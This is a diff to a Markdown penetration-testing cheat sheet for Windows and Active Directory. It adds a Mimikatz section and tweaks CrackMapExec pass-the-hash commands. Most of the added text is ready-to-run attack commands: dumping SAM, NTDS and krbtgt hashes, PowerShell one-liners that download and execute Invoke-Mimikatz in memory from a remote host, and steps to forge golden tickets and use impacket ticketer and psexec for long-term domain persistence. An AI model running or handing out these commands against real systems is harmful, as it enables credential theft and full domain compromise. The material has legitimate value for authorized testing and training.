@@ -29,6 +29,7 @@
 - [__EternalBlue__](#EternalBlue)
 - [__Nishang__](#Nishang)
 - [__Powershell__](#Powershell)
+- [__Mimikatz__](#Mimikatz)
 # Main Enum
 ````
 crackmapexec 10.10.10.0/24
@@ -261,9 +262,11 @@ cme smb 10.10.10.x -u 'username' -H 'NTLM hash' --sam
 
 cme smb 10.10.10.x -u 'username' -p 'password' --sam
 
-cme smb 10.10.10.x -u 'username' -p 'password' -M rdp -o ACTION=enable
+cme smb 10.10.10.x -u 'username' -p 'password' -M rdp -o ACTION='enable'
 
-cme smb 10.10.10.x -u 'username' -H 'NTLM hash' -M -rdp -o ACTION=enable
+cme smb 10.10.10.x -u 'username' -H 'NTLM hash' -M -rdp -o ACTION='enable' --obfs
+
+cme smb 10.10.10.x -u 'username' -H 'NTLM hash' -M -rdp -o ACTION='enable'
 
 cme smb 10.10.10.x -u username -p 'password' --ntds
 
@@ -535,3 +538,135 @@ Get-ADUserResultantPasswordPolicy
 
 Get-ADUserResultantPasswordPolicy -Identity pepe
 ```
+> # __Mimikatz__
+- __https://github.com/gentilkiwi/mimikatz/releases__
+- __https://github.com/gentilkiwi/mimikatz/wiki__
+- __https://www.varonis.com/blog/what-is-mimikatz/__
+- __https://adsecurity.org/?page_id=1821__
+- __https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn408187(v=ws.11)?redirectedfrom=MSDN__
+- __https://docs.microsoft.com/es-es/windows/win32/api/ntsecapi/ne-ntsecapi-kerb_protocol_message_type?redirectedfrom=MSDN__
+- __https://attack.mitre.org/software/S0002/__
+
+>  Mimikatz is an open source program used by penetration testers to steal credentials in Windows. Let's say it's a Swiss army knife for windows, very good and recommended.
+
+* * Mimikatz Dumps
+> With mimikatz, we can attack critical parts, such as dump NTLM, cleartext-passwords, kerberos tickets, etc... I will leave some links so that you can study more in depth the operation of this tool.
+
+* * NTLM SAM file hashes dump
+
+> First of all, it wouldn't hurt to look at the architecture to know that you are in the right process, to avoid false positives at post-exploitation time.
+```
+.\mimikatz.exe
+```
+```
+privilege::debug
+token::elevate
+lsadump::sam
+```
+![mimikatz](https://user-images.githubusercontent.com/84678370/129926509-8ac2f0b8-1953-4152-a011-102bb268dfed.png)
+
+### __privilege::debug__
+
+- - __https://github.com/gentilkiwi/mimikatz/wiki/module-~-privilege__
+- - __https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debug-privilege?redirectedfrom=MSDN__
+
+> The debug privilege allows someone to debug a process that they wouldn’t otherwise have access to. For example, a process running as a user with the debug privilege enabled on its token can debug a service running as local system.
+
+### __token::elevate__
+
+- - __https://book.hacktricks.xyz/windows/stealing-credentials/credentials-mimikatz#token__
+- - __https://docs.microsoft.com/es-es/windows/win32/secauthz/impersonation-tokens__
+
+> Impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box.
+
+### __lsadump::sam__
+
+- - __https://adsecurity.org/?page_id=1821#LSADUMPSAM__
+- - __https://docs.microsoft.com/es-es/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection__
+- - __https://docs.microsoft.com/es-es/windows-server/security/credentials-protection-and-management/whats-new-in-credential-protection__
+
+> Get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer, great.
+---
+## __Golden Ticket__
+- __https://docs.microsoft.com/es-es/defender-for-identity/domain-dominance-alerts__
+- __https://attack.mitre.org/techniques/T1558/001/__
+- __https://attack.mitre.org/mitigations/M1026/__
+- __https://attack.mitre.org/tactics/TA0006/__
+- __https://www.qomplx.com/qomplx-knowledge-golden-ticket-attacks-explained/__
+- __https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/__
+- __https://blog.gentilkiwi.com/securite/mimikatz/golden-ticket-kerberos__
+
+> Adversaries who have the KRBTGT account password hash can forge Kerberos ticket-granting tickets (TGTs), also known as golden tickets. Golden tickets allow adversaries to generate authentication material for any Active Directory account. Ultimately, it can be used for the persistence phase in the forest, large, for example, to impersonate the Domain Administrator for 10 years or the specified period.
+
+> The first thing to do is to get the hashes of the krbtgt account.
+
+- __https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1__
+
+> To execute this attack, we have to be in the domain as a domain administrator user.
+
+> The next way to load it into memory is if we have internet access, otherwise we would have to load it in another way.
+* * In-Memory
+```
+IEX ([System.Text.Encoding]::UTF8.GetString((New-Object system.net.WebClient).DownloadData("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")))
+```
+
+* * In-Memory Another way
+```
+python3 -m http.server
+```
+
+```
+IEX(New-Object system.Net.WebClient).downloadString('http://ip:port/Invoke-Mimikatz.ps1')
+```
+
+* * Dump
+```
+Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'
+```
+
+* * Gold-Ticket
+```
+Invoke-Mimikatz -Command '"kerberos::golden /domain:pepe.local /sid:S-1-5... /rc4:<NTLM> /user:Administrator /ticket:gold.kirbi"'
+```
+* * Pesistence-Gold.kirbi
+
+![image](https://user-images.githubusercontent.com/84678370/129996058-d9aa82e5-6ecb-4e27-9be3-3711fdb8eb3e.png)
+
+> It is clear that we cannot list the DC files. It would be bad enough if we could without any permissions. This is where our precious mimikatz & gold.kirbi comes in.
+
+```
+mimikatz.exe
+```
+
+```
+kerberos::ptt gold.kirbi
+
+exit
+```
+![image](https://user-images.githubusercontent.com/84678370/129995781-d88fad4c-f0ec-4457-bbc6-3abb0c7543ca.png)
+
+### __Persistence-Ticketer__
+
+- __https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py__
+
+> This script will create TGT/TGS tickets from scratch or based on a template (legally requested from the KDC)
+allowing you to customize some of the parameters set inside the PAC_LOGON_INFO structure, in particular the groups, extrasids, etc. Tickets duration is fixed to 10 years from now (although you can manually change it)
+
+```
+impacket-ticketer -nthash <ntlm> -domain-sid S-1-5-2... -domain pepe.local Administrador
+```
+> On our machine (I say this just in case) we have to specify to an environment variable (KRB5CCNAME) the absolute path where Ticketer has saved the Administrator.ccache file.
+
+```
+export KRB5CCNAME="/path/to/file.ccache"
+```
+
+> The surprising thing after this, is that no matter how much the Administrator user changes the password, it is not going to do him any good, since we can even do persistence with psexec without providing the password.
+
+```
+impacket-psexec -k -n pepe.local/Administrator@DC-NAME cmd.exe
+```
+![Ticketer](https://user-images.githubusercontent.com/84678370/129994100-20be12cd-b95d-4c97-8a2c-8e528a7a55df.png)
+
+#### Add DC-NAME to your etc/hosts
+---
